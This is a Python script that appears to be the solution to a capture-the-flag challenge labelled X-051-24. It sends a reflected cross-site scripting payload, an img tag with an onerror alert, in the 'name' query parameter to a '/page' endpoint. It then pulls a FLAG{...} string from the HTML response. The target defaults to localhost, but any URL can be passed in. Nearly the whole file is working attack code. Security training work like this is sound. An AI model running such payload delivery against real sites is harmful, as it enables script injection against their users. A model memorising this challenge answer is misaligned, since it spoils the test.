#!/usr/bin/env python3
"""Automated exploit for the X-051-24 challenge."""

import argparse
import re
import sys
from urllib.parse import urljoin

import requests


PAYLOAD = '<img src=x onerror=alert("XSS")>'


def exploit(base_url, payload):
    """Trigger the reflected XSS payload and return the HTTP response text."""

    target = urljoin(base_url.rstrip('/') + '/', 'page')
    response = requests.get(target, params={'name': payload}, timeout=10)
    response.raise_for_status()
    return response.text


def extract_flag(response_text):
    """Extract the flag from the HTML response, if present."""

    match = re.search(r'FLAG\{[^}]+\}', response_text)
    return match.group(0) if match else None


def main():
    parser = argparse.ArgumentParser(description="X-051-24 XSS exploit")
    parser.add_argument(
        'base_url',
        nargs='?',
        default='http://localhost:5000/',
        help='Root URL of the target instance (default: %(default)s)'
    )
    parser.add_argument(
        '--payload',
        default=PAYLOAD,
        help='Custom payload to use (default: %(default)s)'
    )

    args = parser.parse_args()

    try:
        html = exploit(args.base_url, args.payload)
    except requests.RequestException as exc:
        print(f'[!] Request failed: {exc}')
        sys.exit(1)

    flag = extract_flag(html)
    if flag:
        print(f'[+] Flag: {flag}')
    else:
        print('[!] Exploit sent, but flag not found in response.')
        print('--- Response snippet ---')
        print(html[:500])


if __name__ == '__main__':
    main()
